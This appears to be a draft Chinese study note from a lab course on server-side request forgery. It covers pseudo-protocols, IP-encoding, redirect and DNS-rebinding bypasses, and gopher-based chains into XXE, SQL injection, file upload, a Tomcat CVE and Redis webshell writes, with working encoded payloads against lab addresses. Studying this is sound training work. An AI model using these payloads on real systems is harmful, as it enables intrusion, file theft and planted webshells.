---
title: "SSRF"
date: "2026-02-19"
lastmod: "2026-08-15T00:00:00+08:00"
slug: "SSRF基础"
summary: ""
tags:
  - "随笔"
params:
  protected: false
  commentId: "SSRF基础"
  legacyId: "SSRF基础"
cover: ""
draft: true
---

# SSRF

```
cd ~/Desktop/SSRF    进入 SSRF 目录
docker-compose up -d  启动容器
docker ps  确认端口占用
```

windows环境：http://192.168.124.129:9091/

内网横移？

#### **0x1.NAT前置知识**

**NAT**(Network Address Translation)

**网络地址转换**

通过将外部ip地址和端口映射到更大的内部IP地址集来转换ip地址

端口映射

![1769360707337](/assets/img/ssrf/1769360707337.png)



防火墙策略(添堵)          

网络地址转换NAT

pc想要访问内网，

防火墙如何转发

web1存在公网和私网地址

​				公网端口和私网端口

如外部访问web1的公网，则告知给私网地址，并修改端口为私网端口，公网的A:B映射给死亡的a:b

pc公网<-->防火墙-->web2内网(静态nat)

  |_______________________________________________________________________|

#### **0x2.SSRF漏洞原理**

1.成因

**{service side request forgery}**

**服务器请求伪造**

是一种由攻击者形成服务器端发起的漏洞，本质是属于**信息泄露漏洞**

A通过b拿到c，c通过b回到A。

**攻击目标**：

从外网无法访问的内部系统。

**形成原因**：

almost由于服务端提供了从其他服务器应用获取数据的功能，且没有队目标地址进行过滤和限制。

eg.

加载指定地址获取网页文本内容。

识图，给一串url就能识别图片。

2.干什么

**攻击方式**：借助主机A发起攻击，向B发起请求，从而得到B的一些信息

![1769362207439](/assets/img/ssrf/1769362207439.png)

PHP实现：cuel_exec

通过a（ssrf服务器）访问a所在内网的服务器

由ssrf的服务器发送http伪协议链接给内网服务器

内网服务器把结果发送回ssrf服务器

![1769362521343](/assets/img/ssrf/1769362521343.png)

#### **0x3.SSRF信息搜集File伪协议**

打内网

**伪协议**：

```
file:// 从文本系统中获取内容如file:///etc/passwd
dict:// 字典服务协议，访问字典资源dict:///ip:6739/info:
ftp:// 可用于网络端口扫描
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议
gopher:// 分布式文档传递服务
```

![1769362939347](/assets/img/ssrf/1769362939347.png)

**arp协议***

使用bp的intruder功能

扫描存活主机

获取ip

#### 0x4.Dict伪协议

解决实现对内网探测

较快；寻找有哪些端口

![1769721063744](/assets/img/ssrf/1769721063744.png)

#### 0x5.Http伪协议

常规url形式，允许通过htto1.0的get方法，以只读访问文件和资源

远程文件包含

file：查找内网存活主机

dict：查找内网主机开放端口

http：目录扫描

![1769722198139](/assets/img/ssrf/1769722198139.png)

对/后内容进行int

将index.php进行替换；查看常见地址

一般直接将index替换；随后进行长短判断内容

#### 0x6.Gopher伪协议

http协议前身

利用范围：

```
get提交
post提交
redis
fastcgi
sql
```

1.为什么使用？

可以将内容作为数据流进行提交

2.可以进行get/post提交

格式：

```
URL:gopher://<host>:<port>/<gopher-path>
```

主机；端口；<gopher提交内容>

》web也需要加端口号为80

gopher协议默认端口为70

gopher请求不转发第一个字符

常使用_abcd,,的一个下划线作为填充位使用

![1769723391506](/assets/img/ssrf/1769723391506.png)

**get**提交poc：

```
保留头部信息：
1.路径：GET /name.php?name=ben HTTP/1.1   \n
------换行符不可少
2.目标ip地址: Host:172.250.250.4
```

```
gopher://172.250.250.4:80/_GET%20/name.php%3fname=ben HTTP/1.1%0d%0AHost:172.250.250.4%0d%0A

注意添加端口号80和填充位_
URL编码
空格    %20
问号    %3f
换行符  %0d%0A
```

传参时bp做**两次url编码**：攻击者发送，ssrf服务器解码第一次；被攻击服务器解码第二次；

![1769724000872](/assets/img/ssrf/1769724000872.png)



**post**提交poc：

```
需要保留头部信息：
1.POST /name.php HTTP/1.1
2.HOST:172.250.250.4
3.content-Type:application/x-www-form-urlenconded
4.content-Length:13           ----如果短了只读所写长度

name=jianjian
```

```
url=gopher://172.250.250.4:80/_1.POST /name.php HTTP/1.1
2.HOST:172.250.250.4
3.content-Type:application/x-www-form-urlenconded
4.content-Length:13

name=jianjian
##进行两次url编码
```

#### 0x7.SSRF之环回地址绕过

127.0.0.1常被限制

将127.0.0.1**变形**显示

```
127.0.0.1 点分十进制
0b 01111111000000000000000000000001  数据包中实际上是32位bit二进制，没有点
0 17700000001 八进制     --点分八进制 0177.0000.0001
0x 7F000001 十六进制    --点分十六进制 0x7F.0x00.0x00.0x01
									0x7F.0.0.1
2130706433 十进制（连续）
```

http://127.0.0.1/flag.php

将127.0.0.1替换为上述进行绕过

#### 0x8.302重定向绕过

绕过ip限制

针对私网地址被限制的情况

302重定向原理

公网地址：7777

![1769725113888](/assets/img/ssrf/1769725113888.png)

构建302重定向代码

不能用python

```
php - S 0.0.0.0.7777           -监听7777端口
```

例如：

```
写index.php内容为
<?php
header('Location:htytp://127.0.0.1/flag.php');
```

```
http://公网ip:7777/index.php
```

302重定向到flag.php文件位置

得到flag

#### 0x9.DNS重绑定绕过

针对SSRF漏洞的防御

```
1.解析目标URL，获取Host
2.解析Host，获取Host指向的ip地址
3.检查ip地址是否为内网地址
4.请求url
5.如果有跳转，拿出跳转url，执行1
```

有效限制：

```
直接访问内网IP；
302跳转；
xip.io/xip.name及短链接变换等URL变形；
畸形URL；
iframe攻击；
IP进制转换
```

针对这种防御可以采用：**DNS Rebinding Attack（DNS重绑定攻击）**

![1769726448772](/assets/img/ssrf/1769726448772.png)

利用第二次DNS进行漏洞利用

第一次DNS查询URL

第二次DNS查询将会真正访问URL

![1769726612007](/assets/img/ssrf/1769726612007.png)

缓存时间与ttl有关

有运气成分

```
https://lock.cmpxchg8b.com/rebinder.html
```

![1769799244581](/assets/img/ssrf/1769799244581.png)

前后不重要{a公网；b私网}

，输入后生成一个DNS解析的域名

例如此处可以查看http://7f000001.c0a80001.rbndr.us/flag.php

#### 0x10.使用SSRF进行命令执行

1.使用伪协议进行信息搜集

2利用shell.php页面进行命令执行

#### 0x11.使用SSRF进行POST提交命令执行

开放80端口且界面可以POST提交

gopher伪协议进行POST提交

![1769801247696](/assets/img/ssrf/1769801247696.png)

通过源代码查看name对应值

构造poc得到flag



#### 0x12.使用SSRF进行XXE漏洞利用

1.信息搜集

伪协议

源代码

![1769801599938](/assets/img/ssrf/1769801599938.png)

典型特征xml

![1769801717015](/assets/img/ssrf/1769801717015.png)

![1769801733130](/assets/img/ssrf/1769801733130.png)

![1769801749307](/assets/img/ssrf/1769801749307.png)

构造payload

```
POST /doLogin.php HTTP/1.1
Hpst: 172.250.250.6
Content-Type: application/xml;charset=utf-8
Content-Length: 65

<user><username>admin</username><password>admin</password>
```

然后使用bp拦截

```
gopher://xxx:xx/_POST /doLogin.php HTTP/1.1
Hpst: 172.250.250.6
Content-Type: application/xml;charset=utf-8
Content-Length: 65

<user><username>admin</username><password>admin</password>
```

进行两次url编码

XXE漏洞基础构造

```
<!DOCTYPE root [<!ENTITY lily SYSTEM "file:///etc/passwd">]><user><username>&lily;</username><password>admin</password>
```

变量名：lily

赋值：file:///etc/passwd

调用：&lily;

#### 0x13.使用SSRF进行SQL注入漏洞利用

1.利用http伪协议和获取信息

2.sql注入

GET提交       POST提交



细节：--+应使用%20--%20

gopher伪协议构造

```
gopher://172.250.250.11:80/_POST /Less-11/inddex.php HTTP/1.1
HOST: 172.250.250.11
Content-Type:application/x-www-form-urlencoded
Content-Length:53

uname=-1' union select 1,2 #&passwd=123&submit=Submit
------根据源码信息
```

bp抓包编码

#### 0x14.使用SSRF进行文件上传漏洞利用

![1769803014932](/assets/img/ssrf/1769803014932.png)

文件上传源码分析

![1769803132454](/assets/img/ssrf/1769803132454.png)

构造payload

![1769803224773](/assets/img/ssrf/1769803224773.png)

gopher提交数据

![1769803423192](/assets/img/ssrf/1769803423192.png)



```
POST /Pass-01/index.php HTTP/1.1
Host: 172.250.250.14
Content-Type: multipart/form-data; boundary=----1ebKitFormBoundaryludzaMDs2XDrRaKS
Content-Length: 305

----1ebKitFormBoundaryludzaMDs2XDrRaKS
Content-Disposition: form-data; name="upload_file"; filename="phpinfo.php"
Content-Type: image/jpeg

<?php phpinfo();?>
----1ebKitFormBoundaryludzaMDs2XDrRaKS
Content-Disposition: form-data; name="submit"

上传
----1ebKitFormBoundaryludzaMDs2XDrRaKS--
```

poc

```
gopher://172.250.250.14:80/_POST%20/Pass-01/index.php%20HTTP/1.1%0d%0aHost:%20172.250.250.14%0d%0aContent-Type:%20multipart/form-data;%20boundary=----1ebKitFormBoundaryludzaMDs2XDrRaKS%0d%0aContent-Length:%20305%0d%0a%0d%0a----1ebKitFormBoundaryludzaMDs2XDrRaKS%0d%0aContent-Disposition:%20form-data;%20name=%22upload_file%22;%20filename=%22phpinfo.php%22%0d%0aContent-Type:%20image/jpeg%0d%0a%0d%0a%3C?php%20phpinfo();?%3E%0d%0a----1ebKitFormBoundaryludzaMDs2XDrRaKS%0d%0aContent-Disposition:%20form-data;%20name=%22submit%22%0d%0a%0d%0a上传%0d%0a----1ebKitFormBoundaryludzaMDs2XDrRaKS--%0d%0a
```

上传后查看/upload/phpinfo.php

#### 0x15.使用SSRF进行文件包含漏洞利用

![1769803648839](/assets/img/ssrf/1769803648839.png)

伪协议利用

![1769803750731](/assets/img/ssrf/1769803750731.png)

#### 0x16.使用SSRF对mysql进行未授权查询

```
利用SSRF针对特定应用的特定漏洞
mysal未授权漏洞的利用
如何与mysal进行数据通讯
```

#### 0x17.使用SSRF对mysql进行文件写入

#### 0x18.使用SSRF对tomcat文件写入

```
tomcat漏洞
--任意文件上传
--绕过验证直接在目标主机进行文件上传
CVE-2017-12615
```

固定头部信息

![1769804131695](/assets/img/ssrf/1769804131695.png)

![1769804180356](/assets/img/ssrf/1769804180356.png)

gopher伪协议进行测试；

然后读取/5.jsp

/5.jsp?cmd=执行命令

#### 0x19.对redis未授权webshell写入

~~mysql利用

如果对方有网站，getshell方法

```
1.设置web路径：config set dir /var/www/html
2.设置shell文件名  config set dbfilename phpinfo.php
3.向数据库插入payload  set payload"<?php phpinfo();?>"
4.保存webshell save
quit
```

#### 0x20.对redis未授权ssh公钥写入

#### 0x21.对redis未授权计划任务shell反弹

